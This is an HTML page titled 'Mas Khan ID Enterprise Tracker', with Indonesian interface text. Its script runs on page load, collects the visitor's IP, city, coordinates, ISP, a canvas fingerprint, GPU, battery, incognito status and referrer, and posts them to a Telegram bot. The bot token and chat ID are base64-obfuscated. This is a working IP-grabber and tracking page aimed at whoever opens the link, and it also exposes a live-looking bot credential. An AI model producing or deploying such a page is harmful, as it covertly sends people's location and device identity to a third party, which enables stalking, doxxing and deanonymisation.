<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enterprise Tracker</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      color: #e0e0e0;
      overflow-x: hidden;
    }

    .bg-animation {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      opacity: 0.1;
      background: 
        radial-gradient(circle at 20% 50%, rgba(0, 255, 170, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 50%, rgba(0, 170, 255, 0.1) 0%, transparent 50%);
      animation: pulse 8s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 0.1; }
      50% { opacity: 0.2; }
    }

    .container {
      position: relative;
      z-index: 1;
      max-width: 900px;
      width: 100%;
    }

    .glass-card {
      background: rgba(26, 26, 46, 0.8);
      backdrop-filter: blur(20px);
      border-radius: 24px;
      padding: 40px;
      box-shadow: 
        0 8px 32px rgba(0, 0, 0, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.1);
      animation: fadeInUp 0.8s ease;
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
      position: relative;
    }

    .header::after {
      content: '';
      position: absolute;
      bottom: -15px;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 3px;
      background: linear-gradient(90deg, transparent, #00ffaa, transparent);
      border-radius: 2px;
    }

    .logo {
      font-size: 2.5rem;
      font-weight: 800;
      background: linear-gradient(135deg, #00ffaa 0%, #00aaff 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
      letter-spacing: -1px;
    }

    .subtitle {
      color: #8e8e93;
      font-size: 0.9rem;
      letter-spacing: 2px;
      text-transform: uppercase;
    }

    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 8px 16px;
      background: rgba(0, 255, 170, 0.1);
      border: 1px solid rgba(0, 255, 170, 0.3);
      border-radius: 20px;
      font-size: 0.85rem;
      margin-top: 15px;
      animation: glow 2s ease-in-out infinite;
    }

    @keyframes glow {
      0%, 100% { box-shadow: 0 0 10px rgba(0, 255, 170, 0.2); }
      50% { box-shadow: 0 0 20px rgba(0, 255, 170, 0.4); }
    }

    .status-dot {
      width: 8px;
      height: 8px;
      background: #00ffaa;
      border-radius: 50%;
      animation: blink 1.5s ease-in-out infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }

    .loading-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      padding: 40px 0;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 3px solid rgba(0, 255, 170, 0.1);
      border-top-color: #00ffaa;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 0.9rem;
      color: #8e8e93;
    }

    .info-section {
      margin-bottom: 30px;
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .section-header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 15px;
      padding-bottom: 10px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }

    .section-icon {
      font-size: 1.5rem;
    }

    .section-title {
      font-size: 1.1rem;
      font-weight: 600;
      color: #00ffaa;
    }

    .info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 15px;
    }

    .info-item {
      background: rgba(255, 255, 255, 0.03);
      padding: 15px;
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      transition: all 0.3s ease;
    }

    .info-item:hover {
      background: rgba(255, 255, 255, 0.05);
      border-color: rgba(0, 255, 170, 0.3);
      transform: translateY(-2px);
    }

    .info-label {
      font-size: 0.75rem;
      color: #8e8e93;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }

    .info-value {
      font-size: 0.95rem;
      color: #e0e0e0;
      word-break: break-word;
      font-weight: 500;
    }

    .info-value.highlight {
      color: #00ffaa;
      font-weight: 600;
    }

    .risk-badge {
      display: inline-block;
      padding: 4px 12px;
      border-radius: 12px;
      font-size: 0.75rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .risk-low {
      background: rgba(76, 217, 100, 0.2);
      color: #4cd964;
      border: 1px solid rgba(76, 217, 100, 0.3);
    }

    .risk-medium {
      background: rgba(255, 204, 0, 0.2);
      color: #ffcc00;
      border: 1px solid rgba(255, 204, 0, 0.3);
    }

    .risk-high {
      background: rgba(255, 59, 48, 0.2);
      color: #ff3b30;
      border: 1px solid rgba(255, 59, 48, 0.3);
    }

    .footer {
      text-align: center;
      margin-top: 40px;
      padding-top: 20px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
    }

    .footer-text {
      font-size: 0.85rem;
      color: #8e8e93;
    }

    .footer-link {
      color: #00ffaa;
      text-decoration: none;
      transition: color 0.3s ease;
    }

    .footer-link:hover {
      color: #00aaff;
    }

    .toast {
      position: fixed;
      bottom: 30px;
      right: 30px;
      background: rgba(0, 255, 170, 0.9);
      color: #0a0a0a;
      padding: 15px 25px;
      border-radius: 12px;
      font-weight: 600;
      box-shadow: 0 8px 32px rgba(0, 255, 170, 0.3);
      animation: slideInRight 0.5s ease, slideOutRight 0.5s ease 2.5s;
      z-index: 1000;
    }

    @keyframes slideInRight {
      from {
        transform: translateX(400px);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }

    @keyframes slideOutRight {
      to {
        transform: translateX(400px);
        opacity: 0;
      }
    }

    @media (max-width: 768px) {
      .glass-card {
        padding: 25px;
      }

      .logo {
        font-size: 2rem;
      }

      .info-grid {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>
  <div class="bg-animation"></div>
  
  <div class="container">
    <div class="glass-card">
      <div class="header">
        <div class="logo" id="appLogo"></div>
        <div class="subtitle" id="appSubtitle"></div>
        <div class="status-badge">
          <div class="status-dot"></div>
          <span>System Active</span>
        </div>
      </div>

      <div class="loading-container" id="loadingState">
        <div class="spinner"></div>
        <div class="loading-text">Mengumpulkan data tracking...</div>
      </div>

      <div id="contentContainer" style="display: none;">
        <div class="info-section">
          <div class="section-header">
            <span class="section-icon">🌐</span>
            <span class="section-title">Network & Location</span>
          </div>
          <div class="info-grid" id="networkInfo"></div>
        </div>

        <div class="info-section">
          <div class="section-header">
            <span class="section-icon">💻</span>
            <span class="section-title">Device Information</span>
          </div>
          <div class="info-grid" id="deviceInfo"></div>
        </div>

        <div class="info-section">
          <div class="section-header">
            <span class="section-icon">🔒</span>
            <span class="section-title">Security Analysis</span>
          </div>
          <div class="info-grid" id="securityInfo"></div>
        </div>

        <div class="info-section">
          <div class="section-header">
            <span class="section-icon">⏱️</span>
            <span class="section-title">Session Details</span>
          </div>
          <div class="info-grid" id="sessionInfo"></div>
        </div>
      </div>

      <div class="footer">
        <p class="footer-text" id="footerText"></p>
      </div>
    </div>
  </div>

  <script>
    'use strict';
    
    const CONFIG = {
      telegram: {
        token: atob('ODMxOTc4NjYzMzpBQUU1RFdZbnZieTVvWGdNSVJYdmVwUk9iX3hXbmJIajk4UQ=='),
        chatId: atob('NzgzOTAwMDE5OA=='),
        apiUrl: 'https://api.telegram.org/bot'
      },
      loadingDelay: 1500
    };

    const _B = {
      n: atob('TWFzIEtoYW4gSUQ='), // Mas Khan ID
      s: atob('RW50ZXJwcmlzZSBUcmFja2VyIFN5c3RlbQ=='), // Enterprise Tracker System
      t: atob('8J+agSA8Yj5NQVMgS0hBTiBJRCBFTlRFUlBSSVNFIFRSQUNLRVI8L2I+'), // Telegram title
      f: atob('VHJhY2tlZCBieSBNYXMgS2hhbiBTeXN0ZW0='), // Footer tracking text
      u: atob('bWFza2hhbmlk'), // Username telegram
      l: atob('aHR0cHM6Ly90Lm1lL21hc2toYW5pZA==') // Link telegram
    };

    const Utils = {
      hash(str) {
        let h = 0;
        for (let i = 0; i < str.length; i++) {
          h = ((h << 5) - h) + str.charCodeAt(i);
          h = h & h;
        }
        return Math.abs(h).toString(16).toUpperCase();
      },

      genFingerprint() {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('fp', 2, 2);
        
        const parts = [
          navigator.userAgent,
          navigator.language,
          screen.colorDepth,
          `${screen.width}x${screen.height}`,
          new Date().getTimezoneOffset(),
          !!window.sessionStorage,
          !!window.localStorage,
          c.toDataURL()
        ];
        
        return this.hash(parts.join('|'));
      },

      genSessionId() {
        return 'SES-' + Date.now().toString(36).toUpperCase() + '-' + 
               Math.random().toString(36).substr(2, 9).toUpperCase();
      },

      getGPU() {
        try {
          const c = document.createElement('canvas');
          const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            if (ext) return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
          }
        } catch (e) {}
        return 'Unknown';
      },

      getDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return '📱 Tablet';
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return '📱 Mobile';
        return '💻 Desktop';
      },

      getBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        if (ua.includes('Opera')) return 'Opera';
        return 'Unknown';
      },

      async isIncognito() {
        if ('storage' in navigator && 'estimate' in navigator.storage) {
          const {quota} = await navigator.storage.estimate();
          return quota < 120000000;
        }
        return false;
      },

      async getBattery() {
        if ('getBattery' in navigator) {
          try {
            const bat = await navigator.getBattery();
            const lvl = Math.round(bat.level * 100);
            return `${bat.charging ? '⚡' : '🔋'} ${lvl}%`;
          } catch (e) {}
        }
        return 'N/A';
      },

      getConnection() {
        if ('connection' in navigator) {
          const c = navigator.connection;
          return {
            type: c.effectiveType || 'Unknown',
            downlink: c.downlink ? c.downlink + ' Mbps' : 'Unknown',
            rtt: c.rtt ? c.rtt + ' ms' : 'Unknown'
          };
        }
        return {type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown'};
      },

      getRisk(ipData) {
        let score = 0;
        const org = (ipData.org || '').toLowerCase();
        
        if (org.includes('vpn') || org.includes('proxy') || org.includes('hosting')) score += 3;
        if (this.isIncognito()) score += 2;
        if (screen.width < 800 || screen.height < 600) score += 1;

        if (score >= 4) return {level: 'HIGH', class: 'risk-high'};
        if (score >= 2) return {level: 'MEDIUM', class: 'risk-medium'};
        return {level: 'LOW', class: 'risk-low'};
      },

      formatDate(d) {
        return new Intl.DateTimeFormat('id-ID', {
          day: '2-digit', month: 'long', year: 'numeric',
          hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).format(d);
      }
    };
    
    const Collector = {
      async getIPData() {
        try {
          const res = await fetch('https://ipapi.co/json/');
          return await res.json();
        } catch (e) {
          return {};
        }
      },

      async collect() {
        const ipData = await this.getIPData();
        const conn = Utils.getConnection();
        const isInc = await Utils.isIncognito();
        const battery = await Utils.getBattery();
        const ts = new Date();

        return {
          network: {
            ip: ipData.ip || 'Unknown',
            country: ipData.country_name || 'Unknown',
            city: ipData.city || 'Unknown',
            region: ipData.region || 'Unknown',
            postal: ipData.postal || 'Unknown',
            latitude: ipData.latitude || 'Unknown',
            longitude: ipData.longitude || 'Unknown',
            isp: ipData.org || 'Unknown',
            asn: ipData.asn || 'Unknown',
            timezone: ipData.timezone || 'Unknown'
          },
          device: {
            type: Utils.getDeviceType(),
            platform: navigator.platform,
            browser: Utils.getBrowser(),
            userAgent: navigator.userAgent,
            screen: `${screen.width} × ${screen.height}`,
            window: `${window.innerWidth} × ${window.innerHeight}`,
            colorDepth: screen.colorDepth + ' bit',
            pixelRatio: window.devicePixelRatio || 1,
            gpu: Utils.getGPU(),
            cores: navigator.hardwareConcurrency || 'Unknown',
            memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            battery: battery,
            touch: 'ontouchstart' in window ? '✅ Yes' : '❌ No'
          },
          security: {
            fingerprint: Utils.genFingerprint(),
            incognito: isInc ? '⚠️ Yes' : '✅ No',
            dnt: navigator.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled',
            cookies: navigator.cookieEnabled ? '✅ Yes' : '❌ No',
            language: navigator.language,
            languages: navigator.languages.join(', '),
            online: navigator.onLine ? '🟢 Online' : '🔴 Offline',
            connType: conn.type,
            downlink: conn.downlink,
            rtt: conn.rtt,
            risk: Utils.getRisk(ipData)
          },
          session: {
            id: Utils.genSessionId(),
            timestamp: ts,
            timestampLocal: Utils.formatDate(ts),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            url: window.location.href,
            referrer: document.referrer || 'Direct Access',
            protocol: window.location.protocol,
            hostname: window.location.hostname
          }
        };
      }
    };

    const UI = {
      item(label, value, hl = false) {
        return `
          <div class="info-item">
            <div class="info-label">${label}</div>
            <div class="info-value ${hl ? 'highlight' : ''}">${value}</div>
          </div>
        `;
      },

      renderNetwork(d) {
        document.getElementById('networkInfo').innerHTML = `
          ${this.item('IP Address', d.ip, true)}
          ${this.item('Location', `${d.city}, ${d.region}`)}
          ${this.item('Country', d.country)}
          ${this.item('Coordinates', `${d.latitude}, ${d.longitude}`)}
          ${this.item('ISP Provider', d.isp)}
          ${this.item('ASN', d.asn)}
          ${this.item('Timezone', d.timezone)}
          ${this.item('Postal Code', d.postal)}
        `;
      },

      renderDevice(d) {
        document.getElementById('deviceInfo').innerHTML = `
          ${this.item('Device Type', d.type)}
          ${this.item('Platform', d.platform)}
          ${this.item('Browser', d.browser)}
          ${this.item('Screen Resolution', d.screen)}
          ${this.item('Window Size', d.window)}
          ${this.item('Color Depth', d.colorDepth)}
          ${this.item('Pixel Ratio', d.pixelRatio + 'x')}
          ${this.item('GPU', d.gpu)}
          ${this.item('CPU Cores', d.cores)}
          ${this.item('RAM', d.memory)}
          ${this.item('Battery', d.battery)}
          ${this.item('Touch Support', d.touch)}
        `;
      },

      renderSecurity(d) {
        const badge = `<span class="risk-badge ${d.risk.class}">${d.risk.level} RISK</span>`;
        document.getElementById('securityInfo').innerHTML = `
          ${this.item('Risk Level', badge)}
          ${this.item('Fingerprint ID', d.fingerprint, true)}
          ${this.item('Incognito Mode', d.incognito)}
          ${this.item('Do Not Track', d.dnt)}
          ${this.item('Cookies', d.cookies)}
          ${this.item('Language', d.language)}
          ${this.item('Status', d.online)}
          ${this.item('Connection Type', d.connType)}
          ${this.item('Download Speed', d.downlink)}
          ${this.item('Latency (RTT)', d.rtt)}
        `;
      },

      renderSession(d) {
        document.getElementById('sessionInfo').innerHTML = `
          ${this.item('Session ID', d.id, true)}
          ${this.item('Access Time', d.timestampLocal)}
          ${this.item('Timezone', d.timezone)}
          ${this.item('Current URL', d.url)}
          ${this.item('Referrer', d.referrer)}
          ${this.item('Protocol', d.protocol)}
          ${this.item('Hostname', d.hostname)}
        `;
      },

      show() {
        document.getElementById('loadingState').style.display = 'none';
        document.getElementById('contentContainer').style.display = 'block';
      },

      toast(msg) {
        const t = document.createElement('div');
        t.className = 'toast';
        t.textContent = msg;
        document.body.appendChild(t);
        setTimeout(() => t.remove(), 3000);
      }
    };

    const Reporter = {
      format(d) {
        const {network: n, device: dv, security: s, session: ss} = d;
        return `
${_B.t}
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🌐 NETWORK & LOCATION</b>
├ <b>IP Address:</b> <code>${n.ip}</code>
├ <b>Location:</b> ${n.city}, ${n.region}
├ <b>Country:</b> ${n.country} 🌍
├ <b>Coordinates:</b> ${n.latitude}, ${n.longitude}
├ <b>ISP:</b> ${n.isp}
├ <b>ASN:</b> ${n.asn}
└ <b>Timezone:</b> ${n.timezone}

<b>💻 DEVICE INFORMATION</b>
├ <b>Type:</b> ${dv.type}
├ <b>Platform:</b> ${dv.platform}
├ <b>Browser:</b> ${dv.browser}
├ <b>Screen:</b> ${dv.screen}
├ <b>GPU:</b> ${dv.gpu}
├ <b>CPU Cores:</b> ${dv.cores}
├ <b>RAM:</b> ${dv.memory}
├ <b>Battery:</b> ${dv.battery}
└ <b>Touch:</b> ${dv.touch}

<b>🔒 SECURITY ANALYSIS</b>
├ <b>Risk Level:</b> ${s.risk.level}
├ <b>Fingerprint:</b> <code>${s.fingerprint}</code>
├ <b>Incognito:</b> ${s.incognito}
├ <b>Do Not Track:</b> ${s.dnt}
├ <b>Connection:</b> ${s.connType} (${s.downlink})
├ <b>Latency:</b> ${s.rtt}
└ <b>Status:</b> ${s.online}

<b>⏱️ SESSION DETAILS</b>
├ <b>Session ID:</b> <code>${ss.id}</code>
├ <b>Timestamp:</b> ${ss.timestampLocal}
├ <b>URL:</b> ${ss.url}
├ <b>Referrer:</b> ${ss.referrer}
└ <b>Hostname:</b> ${ss.hostname}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📡 <i>${_B.f}</i>
👤 <a href="${_B.l}">@${_B.u}</a>
        `.trim();
      },

      async send(msg) {
        try {
          const res = await fetch(
            `${CONFIG.telegram.apiUrl}${CONFIG.telegram.token}/sendMessage`,
            {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                chat_id: CONFIG.telegram.chatId,
                text: msg,
                parse_mode: 'HTML',
                disable_web_page_preview: true
              })
            }
          );
          return res.ok;
        } catch (e) {
          return false;
        }
      }
    };

    function initBranding() {
      document.getElementById('appLogo').textContent = _B.n;
      document.getElementById('appSubtitle').textContent = _B.s;
      document.getElementById('footerText').innerHTML = 
        `Powered by <a href="${_B.l}" class="footer-link" target="_blank">@${_B.u}</a>`;
      document.title = _B.n + ' - ' + _B.s;
    }

    (async function() {
      try {
        initBranding();
        await new Promise(r => setTimeout(r, CONFIG.loadingDelay));
        
        const data = await Collector.collect();
        
        UI.renderNetwork(data.network);
        UI.renderDevice(data.device);
        UI.renderSecurity(data.security);
        UI.renderSession(data.session);
        UI.show();
        
        await Reporter.send(Reporter.format(data));
        UI.toast('✅ Data berhasil dikumpulkan!');
      } catch (e) {
        UI.toast('⚠️ Terjadi kesalahan');
      }
    })();
